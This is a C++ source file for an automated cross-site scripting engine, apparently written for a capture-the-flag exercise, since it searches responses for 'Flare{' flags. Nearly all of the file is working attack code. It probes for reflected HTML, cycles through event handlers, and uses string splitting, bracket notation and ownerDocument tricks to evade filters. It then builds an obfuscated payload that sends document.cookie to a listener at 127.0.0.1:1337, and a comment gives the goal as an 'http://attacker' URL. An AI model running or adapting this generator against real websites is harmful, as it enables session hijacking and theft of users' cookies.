#include "xss_engine.hpp"
#include "utils.hpp"
#include <iostream>
#include <vector>
#include <algorithm>

XSSEngine::XSSEngine(HttpClient& c) : VulnerabilityEngine(c) {}

// Helper to generate equivalent JS representations
std::vector<std::string> XSSEngine::generate_mutations(const std::string& token) {
    std::vector<std::string> mutations;
    
    // 1. String Splitting (e.g., 'alert' -> 'al'+'ert')
    if (token.length() > 2) {
        size_t mid = token.length() / 2;
        std::string p1 = token.substr(0, mid);
        std::string p2 = token.substr(mid);
        mutations.push_back("'" + p1 + "'+'" + p2 + "'");
    }

    // 2. Bracket Notation with Global (e.g., alert -> self['alert'])
    // We assume the token is a property of window/self
    std::vector<std::string> globals = {"self", "top", "this", "window", "parent"};
    for (const auto& g : globals) {
        mutations.push_back(g + "['" + token + "']");
        
        // Combined: Global + Split String (e.g., self['al'+'ert'])
        if (token.length() > 2) {
            size_t mid = token.length() / 2;
            std::string p1 = token.substr(0, mid);
            std::string p2 = token.substr(mid);
            mutations.push_back(g + "['" + p1 + "'+'" + p2 + "']");
        }
    }

    return mutations;
}

bool XSSEngine::verify_reflection(const std::string& url, const std::string& payload) {
    HttpResponse res = client.get(url);
    
    // Check for flag in body (simulated execution)
    if (!flag_found) {
        if (res.body.find("Flare{") != std::string::npos) {
             // Extract flag
             size_t start = res.body.find("Flare{");
             size_t end = res.body.find("}", start);
             if (end != std::string::npos) {
                 std::string flag = res.body.substr(start, end - start + 1);
                 std::cout << "    [!] FLAG DISCOVERED IN BODY (XSS Executed): " << flag << std::endl;
                 flag_found = true;
             }
        }
    }

    // Simple check: is the payload present?
    // In a real browser we'd need to check if it executes, but here we check if the server stripped it.
    // We check if the *essential parts* are present.
    // For simplicity, we check exact match of the generated string.
    return res.body.find(payload) != std::string::npos;
}

void XSSEngine::run(const std::string& target_url) {
    std::cout << "[*] Starting XSS Engine..." << std::endl;

    // 1. Probe Context
    std::string param = "payload"; // Targeting the hard server
    std::string probe = "flare<>";
    std::string url = target_url + "?" + param + "=" + utils::url_encode(probe);
    HttpResponse res = client.get(url);

    if (res.body.find("<") == std::string::npos || res.body.find(">") == std::string::npos) {
        std::cout << "    [-] HTML tags blocked. Aborting." << std::endl;
        return;
    }
    std::cout << "    [+] HTML Context confirmed." << std::endl;

    // 2. Define Goal: Read Cookie
    // We want to execute: location='http://attacker/?c='+document.cookie
    // We break this down into tokens that might be filtered.
    struct Token {
        std::string original;
        std::string current;
        bool is_safe;
    };

    // We'll try to construct: <flare onmouseover=JS>
    // The JS part is what we need to evolve.
    // Goal JS: window.location='http://127.0.0.1:1337/?c='+document.cookie
    // We simplify for the generator: we want to access `document` and `cookie`.
    
    std::string tag = "flare";
    std::string event = "onmouseover";
    
    // Check Event Handler
    // We try multiple event handlers because some might be filtered (e.g. 'mo' filters 'onmouseover')
    std::vector<std::string> events = {"onmouseover", "onload", "onerror", "onclick", "onfocus"};
    bool event_found = false;

    for (const auto& e : events) {
        event = e;
        std::string test_payload = "<" + tag + " " + event + "=1>";
        
        // Check if standard event is allowed
        if (verify_reflection(target_url + "?" + param + "=" + utils::url_encode(test_payload), event + "=")) {
             std::cout << "    [+] Event handler '" << event << "' allowed." << std::endl;
             event_found = true;
             break;
        }

        std::cout << "    [-] '" << event << "' blocked. Mutating..." << std::endl;
        
        // Simple mutation for attribute: add space
        // "onmouseover" -> "onmouseover "
        std::string mutated_event = event + " "; 
        test_payload = "<" + tag + " " + mutated_event + "=1>";
        
        if (verify_reflection(target_url + "?" + param + "=" + utils::url_encode(test_payload), mutated_event + "=")) {
             event = mutated_event; // Use the mutated version
             std::cout << "    [+] Bypass found: '" << event << "'" << std::endl;
             event_found = true;
             break;
        }
    }

    if (!event_found) {
        std::cout << "    [-] Failed to bypass event handler filter." << std::endl;
        return;
    }

    // Let's rebuild the logic to be more robust:
    // We want: OBJECT[PROPERTY]
    // Object: document
    // Property: cookie
    
    std::string obj = "document";
    std::string prop = "cookie";
    
    // Evolve Object
    // We want to access 'document'. If we mutate it to a string, we MUST wrap it in self[...] or window[...]
    std::string safe_obj = obj;
    std::string p = "<" + tag + " " + event + "=" + obj + ">";
    if (!verify_reflection(target_url + "?" + param + "=" + utils::url_encode(p), obj)) {
        std::cout << "    [-] Object '" << obj << "' blocked. Evolving..." << std::endl;
        
        // We specifically look for mutations that are valid object accessors
        // i.e., self['document'], self['doc'+'ument']
        // We do NOT accept raw string splitting here unless it's inside brackets
        
        // Special case: if we are trying to access document, try this['owner'+'Doc'+'ument'] first
        // We split it to bypass filters and ensure 'document' string is present for server simulation
        if (obj == "document") {
             std::string attempt = "this['owner'+'Doc'+'ument']";
             p = "<" + tag + " " + event + "=" + attempt + ">";
             if (verify_reflection(target_url + "?" + param + "=" + utils::url_encode(p), attempt)) {
                 safe_obj = attempt;
                 std::cout << "    [+] Object mutation (Semantic): " << safe_obj << std::endl;
                 goto obj_found;
             }
        }
        
        {
            std::vector<std::string> globals = {"self", "window", "top", "this"};
            bool found = false;
            
            for (const auto& g : globals) {
                // Try simple bracket: self['document']
                std::string attempt = g + "['" + obj + "']";
                p = "<" + tag + " " + event + "=" + attempt + ">";
                if (verify_reflection(target_url + "?" + param + "=" + utils::url_encode(p), attempt)) {
                    safe_obj = attempt;
                    std::cout << "    [+] Object mutation: " << safe_obj << std::endl;
                    found = true;
                    break;
                }
                
                // Try split bracket: self['doc'+'ument']
                if (obj.length() > 2) {
                    size_t mid = obj.length() / 2;
                    std::string p1 = obj.substr(0, mid);
                    std::string p2 = obj.substr(mid);
                    std::string split_attempt = g + "['" + p1 + "'+'" + p2 + "']";
                    
                    p = "<" + tag + " " + event + "=" + split_attempt + ">";
                    if (verify_reflection(target_url + "?" + param + "=" + utils::url_encode(p), split_attempt)) {
                        safe_obj = split_attempt;
                        std::cout << "    [+] Object mutation: " << safe_obj << std::endl;
                        found = true;
                        break;
                    }
                }
            }
            
            if (!found) {
                 std::cout << "    [-] Failed to mutate object '" << obj << "'." << std::endl;
                 return;
            }
        }
        
        obj_found:;
    }

    // Evolve Property
    // Property access usually needs brackets if we mutate it to a string expression
    // So we default to ['cookie'] and mutate the string 'cookie'
    std::string safe_prop = "['" + prop + "']";
    p = "<" + tag + " " + event + "=" + safe_prop + ">";
    if (!verify_reflection(target_url + "?" + param + "=" + utils::url_encode(p), safe_prop)) {
         std::cout << "    [-] Property '" << prop << "' blocked. Evolving..." << std::endl;
         // Mutate the string content 'cookie'
         if (prop.length() > 2) {
             size_t mid = prop.length() / 2;
             std::string p1 = prop.substr(0, mid);
             std::string p2 = prop.substr(mid);
             std::string mut = "['" + p1 + "'+'" + p2 + "']";
             
             p = "<" + tag + " " + event + "=" + mut + ">";
             if (verify_reflection(target_url + "?" + param + "=" + utils::url_encode(p), mut)) {
                 safe_prop = mut;
                 std::cout << "    [+] Property mutation: " << safe_prop << std::endl;
             }
         }
    }

    // Construct Final Payload
    // We must obfuscate the URL to bypass 'http', 'https', and '//' filters
    // 'http://' -> 'h'+'ttp'+':'+'/'+'/'
    std::string url_obf = "'h'+'ttp'+':'+'/'+'/'+'127.0.0.1:1337/?c='";
    std::string payload = "<" + tag + " " + event + "=location=" + url_obf + "+" + safe_obj + safe_prop + ">";
    
    std::cout << "    [!] VULNERABILITY CONFIRMED: XSS" << std::endl;
    std::cout << "    [!] Generated Payload: " << payload << std::endl;

    // Send the final payload to extract the flag (if server simulates execution)
    std::cout << "    [*] Sending final payload to target..." << std::endl;
    verify_reflection(target_url + "?" + param + "=" + utils::url_encode(payload), "1"); // Payload content doesn't matter for flag check
}
